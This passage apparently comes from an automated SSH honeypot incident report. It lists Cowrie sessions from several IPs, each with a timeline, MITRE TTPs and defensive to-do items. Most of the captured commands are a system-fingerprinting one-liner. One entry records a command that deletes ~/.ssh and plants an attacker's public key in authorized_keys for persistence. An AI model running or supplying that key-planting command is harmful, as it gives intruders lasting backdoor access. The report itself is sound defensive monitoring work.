| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:58:50` | `cowrie.session.connect` |
| `2026-07-21 04:58:51` | `cowrie.client.version` |
| `2026-07-21 04:58:51` | `cowrie.client.kex` |
| `2026-07-21 04:58:52` | `cowrie.login.success` |
| `2026-07-21 04:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.159.113[.]178` to AbuseIPDB if not already reported
- [ ] Block `45.159.113[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d569538fd22a

| Field | Detail |
|---|---|
| **Source IP** | `45.159.113[.]178` |
| **First Seen** | 2026-07-21 04:58 |
| **Last Seen** | 2026-07-21 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:58:52` | `cowrie.session.connect` |
| `2026-07-21 04:58:52` | `cowrie.client.version` |
| `2026-07-21 04:58:52` | `cowrie.client.kex` |
| `2026-07-21 04:58:53` | `cowrie.login.success` |
| `2026-07-21 04:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.159.113[.]178` to AbuseIPDB if not already reported
- [ ] Block `45.159.113[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04993e9522f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:59 |
| **Last Seen** | 2026-07-21 04:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:59:09` | `cowrie.session.connect` |
| `2026-07-21 04:59:09` | `cowrie.client.version` |
| `2026-07-21 04:59:09` | `cowrie.client.kex` |
| `2026-07-21 04:59:11` | `cowrie.login.success` |
| `2026-07-21 04:59:12` | `cowrie.session.params` |
| `2026-07-21 04:59:12` | `cowrie.command.input` |
| `2026-07-21 04:59:12` | `cowrie.command.input` |
| `2026-07-21 04:59:12` | `cowrie.command.input` |
| `2026-07-21 04:59:12` | `cowrie.command.input` |
| `2026-07-21 04:59:12` | `cowrie.command.input` |
| `2026-07-21 04:59:12` | `cowrie.command.success` |
| `2026-07-21 04:59:12` | `cowrie.command.input` |
| `2026-07-21 04:59:12` | `cowrie.command.input` |
| `2026-07-21 04:59:12` | `cowrie.command.input` |
| `2026-07-21 04:59:12` | `cowrie.command.input` |
| `2026-07-21 04:59:13` | `cowrie.log.closed` |
| `2026-07-21 04:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba218b90cad

| Field | Detail |
|---|---|
| **Source IP** | `187.49.63[.]51` |
| **First Seen** | 2026-07-21 05:00 |
| **Last Seen** | 2026-07-21 05:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:00:12` | `cowrie.session.connect` |
| `2026-07-21 05:00:12` | `cowrie.client.version` |
| `2026-07-21 05:00:12` | `cowrie.client.kex` |
| `2026-07-21 05:00:14` | `cowrie.login.success` |
| `2026-07-21 05:00:14` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.49.63[.]51` to AbuseIPDB if not already reported
- [ ] Block `187.49.63[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f9a8b7340eb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:01 |
| **Last Seen** | 2026-07-21 05:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:01:06` | `cowrie.session.connect` |
| `2026-07-21 05:01:06` | `cowrie.client.version` |
| `2026-07-21 05:01:06` | `cowrie.client.kex` |
| `2026-07-21 05:01:08` | `cowrie.login.success` |
| `2026-07-21 05:01:09` | `cowrie.session.params` |
| `2026-07-21 05:01:09` | `cowrie.command.input` |
| `2026-07-21 05:01:09` | `cowrie.command.input` |
| `2026-07-21 05:01:09` | `cowrie.command.input` |
| `2026-07-21 05:01:09` | `cowrie.command.input` |
| `2026-07-21 05:01:09` | `cowrie.command.input` |
| `2026-07-21 05:01:09` | `cowrie.command.success` |
| `2026-07-21 05:01:09` | `cowrie.command.input` |
| `2026-07-21 05:01:09` | `cowrie.command.input` |
| `2026-07-21 05:01:09` | `cowrie.command.input` |
| `2026-07-21 05:01:09` | `cowrie.command.input` |
| `2026-07-21 05:01:10` | `cowrie.log.closed` |
| `2026-07-21 05:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-311f4d2e3526

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:03 |
| **Last Seen** | 2026-07-21 05:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:03:03` | `cowrie.session.connect` |
| `2026-07-21 05:03:03` | `cowrie.client.version` |
| `2026-07-21 05:03:03` | `cowrie.client.kex` |
| `2026-07-21 05:03:05` | `cowrie.login.success` |
| `2026-07-21 05:03:06` | `cowrie.session.params` |
| `2026-07-21 05:03:06` | `cowrie.command.input` |
| `2026-07-21 05:03:06` | `cowrie.command.input` |
| `2026-07-21 05:03:06` | `cowrie.command.input` |
| `2026-07-21 05:03:06` | `cowrie.command.input` |
| `2026-07-21 05:03:06` | `cowrie.command.input` |
| `2026-07-21 05:03:06` | `cowrie.command.success` |
| `2026-07-21 05:03:06` | `cowrie.command.input` |
| `2026-07-21 05:03:06` | `cowrie.command.input` |
| `2026-07-21 05:03:06` | `cowrie.command.input` |
| `2026-07-21 05:03:06` | `cowrie.command.input` |
| `2026-07-21 05:03:07` | `cowrie.log.closed` |
| `2026-07-21 05:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26033e20a892

| Field | Detail |
|---|---|
| **Source IP** | `112.28.73[.]142` |
| **First Seen** | 2026-07-21 05:03 |
| **Last Seen** | 2026-07-21 05:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:03:25` | `cowrie.session.connect` |
| `2026-07-21 05:03:26` | `cowrie.client.version` |
| `2026-07-21 05:03:26` | `cowrie.client.kex` |
| `2026-07-21 05:03:28` | `cowrie.login.success` |
| `2026-07-21 05:03:29` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.28.73[.]142` to AbuseIPDB if not already reported
- [ ] Block `112.28.73[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae14883d106a

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-07-21 05:03 |
| **Last Seen** | 2026-07-21 05:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:03:35` | `cowrie.session.connect` |
| `2026-07-21 05:03:36` | `cowrie.client.version` |
| `2026-07-21 05:03:36` | `cowrie.client.kex` |
| `2026-07-21 05:03:38` | `cowrie.login.success` |
| `2026-07-21 05:03:39` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-811dafe91510

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:05 |
| **Last Seen** | 2026-07-21 05:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:05:01` | `cowrie.session.connect` |
| `2026-07-21 05:05:01` | `cowrie.client.version` |
| `2026-07-21 05:05:01` | `cowrie.client.kex` |
| `2026-07-21 05:05:03` | `cowrie.login.success` |
| `2026-07-21 05:05:04` | `cowrie.session.params` |
| `2026-07-21 05:05:04` | `cowrie.command.input` |
| `2026-07-21 05:05:04` | `cowrie.command.input` |
| `2026-07-21 05:05:04` | `cowrie.command.input` |
| `2026-07-21 05:05:04` | `cowrie.command.input` |
| `2026-07-21 05:05:04` | `cowrie.command.input` |
| `2026-07-21 05:05:04` | `cowrie.command.success` |
| `2026-07-21 05:05:04` | `cowrie.command.input` |
| `2026-07-21 05:05:04` | `cowrie.command.input` |
| `2026-07-21 05:05:04` | `cowrie.command.input` |
| `2026-07-21 05:05:04` | `cowrie.command.input` |
| `2026-07-21 05:05:05` | `cowrie.log.closed` |
| `2026-07-21 05:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c02d2e791a7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:06 |
| **Last Seen** | 2026-07-21 05:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:06:56` | `cowrie.session.connect` |
| `2026-07-21 05:06:56` | `cowrie.client.version` |
| `2026-07-21 05:06:56` | `cowrie.client.kex` |
| `2026-07-21 05:06:58` | `cowrie.login.success` |
| `2026-07-21 05:07:00` | `cowrie.session.params` |
| `2026-07-21 05:07:00` | `cowrie.command.input` |
| `2026-07-21 05:07:00` | `cowrie.command.input` |
| `2026-07-21 05:07:00` | `cowrie.command.input` |
| `2026-07-21 05:07:00` | `cowrie.command.input` |
| `2026-07-21 05:07:00` | `cowrie.command.input` |
| `2026-07-21 05:07:00` | `cowrie.command.success` |
| `2026-07-21 05:07:00` | `cowrie.command.input` |
| `2026-07-21 05:07:00` | `cowrie.command.input` |
| `2026-07-21 05:07:00` | `cowrie.command.input` |
| `2026-07-21 05:07:00` | `cowrie.command.input` |
| `2026-07-21 05:07:00` | `cowrie.log.closed` |
| `2026-07-21 05:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273a47773525

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-07-21 05:07 |
| **Last Seen** | 2026-07-21 05:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:07:05` | `cowrie.session.connect` |
| `2026-07-21 05:07:05` | `cowrie.client.version` |
| `2026-07-21 05:07:05` | `cowrie.client.kex` |
| `2026-07-21 05:07:06` | `cowrie.login.success` |
| `2026-07-21 05:07:06` | `cowrie.session.params` |
| `2026-07-21 05:07:06` | `cowrie.command.input` |
| `2026-07-21 05:07:06` | `cowrie.command.failed` |
| `2026-07-21 05:07:07` | `cowrie.log.closed` |
| `2026-07-21 05:07:08` | `cowrie.session.params` |
| `2026-07-21 05:07:08` | `cowrie.command.input` |
| `2026-07-21 05:07:08` | `cowrie.session.file_download` |
| `2026-07-21 05:07:08` | `cowrie.log.closed` |
| `2026-07-21 05:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3554dd6a1be6

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-07-21 05:07 |
| **Last Seen** | 2026-07-21 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:07:08` | `cowrie.session.connect` |
| `2026-07-21 05:07:08` | `cowrie.client.version` |
| `2026-07-21 05:07:08` | `cowrie.client.kex` |
| `2026-07-21 05:07:09` | `cowrie.login.success` |
| `2026-07-21 05:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c6b4bb397dd

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-07-21 05:07 |
| **Last Seen** | 2026-07-21 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:07:10` | `cowrie.session.connect` |
| `2026-07-21 05:07:10` | `cowrie.client.version` |
| `2026-07-21 05:07:10` | `cowrie.client.kex` |
| `2026-07-21 05:07:10` | `cowrie.login.success` |
| `2026-07-21 05:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3618da4c111e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:08 |
| **Last Seen** | 2026-07-21 05:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:08:52` | `cowrie.session.connect` |
| `2026-07-21 05:08:52` | `cowrie.client.version` |
| `2026-07-21 05:08:52` | `cowrie.client.kex` |
| `2026-07-21 05:08:54` | `cowrie.login.success` |
| `2026-07-21 05:08:56` | `cowrie.session.params` |
| `2026-07-21 05:08:56` | `cowrie.command.input` |
| `2026-07-21 05:08:56` | `cowrie.command.input` |
| `2026-07-21 05:08:56` | `cowrie.command.input` |
| `2026-07-21 05:08:56` | `cowrie.command.input` |
| `2026-07-21 05:08:56` | `cowrie.command.input` |
| `2026-07-21 05:08:56` | `cowrie.command.success` |
| `2026-07-21 05:08:56` | `cowrie.command.input` |
| `2026-07-21 05:08:56` | `cowrie.command.input` |
| `2026-07-21 05:08:56` | `cowrie.command.input` |
| `2026-07-21 05:08:56` | `cowrie.command.input` |
| `2026-07-21 05:08:56` | `cowrie.log.closed` |
| `2026-07-21 05:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83cd8556d152

| Field | Detail |
|---|---|
| **Source IP** | `138.118.213[.]68` |
| **First Seen** | 2026-07-21 05:09 |
| **Last Seen** | 2026-07-21 05:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:09:35` | `cowrie.session.connect` |
| `2026-07-21 05:09:36` | `cowrie.client.version` |
| `2026-07-21 05:09:36` | `cowrie.client.kex` |
| `2026-07-21 05:09:38` | `cowrie.login.success` |
| `2026-07-21 05:09:39` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:09:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.213[.]68` to AbuseIPDB if not already reported
- [ ] Block `138.118.213[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-015ad0e6d4cc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:10 |
| **Last Seen** | 2026-07-21 05:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:10:51` | `cowrie.session.connect` |
| `2026-07-21 05:10:51` | `cowrie.client.version` |
| `2026-07-21 05:10:51` | `cowrie.client.kex` |
| `2026-07-21 05:10:53` | `cowrie.login.success` |
| `2026-07-21 05:10:55` | `cowrie.session.params` |
| `2026-07-21 05:10:55` | `cowrie.command.input` |
| `2026-07-21 05:10:55` | `cowrie.command.input` |
| `2026-07-21 05:10:55` | `cowrie.command.input` |
| `2026-07-21 05:10:55` | `cowrie.command.input` |
| `2026-07-21 05:10:55` | `cowrie.command.input` |
| `2026-07-21 05:10:55` | `cowrie.command.success` |
| `2026-07-21 05:10:55` | `cowrie.command.input` |
| `2026-07-21 05:10:55` | `cowrie.command.input` |
| `2026-07-21 05:10:55` | `cowrie.command.input` |
| `2026-07-21 05:10:55` | `cowrie.command.input` |
| `2026-07-21 05:10:55` | `cowrie.log.closed` |
| `2026-07-21 05:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-483ed704a241

| Field | Detail |
|---|---|
| **Source IP** | `185.2.228[.]48` |
| **First Seen** | 2026-07-21 05:11 |
| **Last Seen** | 2026-07-21 05:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:11:31` | `cowrie.session.connect` |
| `2026-07-21 05:11:31` | `cowrie.client.version` |
| `2026-07-21 05:11:31` | `cowrie.client.kex` |
| `2026-07-21 05:11:32` | `cowrie.login.success` |
| `2026-07-21 05:11:32` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.228[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.2.228[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80fc8514091

| Field | Detail |
|---|---|
| **Source IP** | `122.176.45[.]238` |
| **First Seen** | 2026-07-21 05:11 |
| **Last Seen** | 2026-07-21 05:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:11:42` | `cowrie.session.connect` |
| `2026-07-21 05:11:43` | `cowrie.client.version` |
| `2026-07-21 05:11:43` | `cowrie.client.kex` |
| `2026-07-21 05:11:45` | `cowrie.login.success` |
| `2026-07-21 05:11:46` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
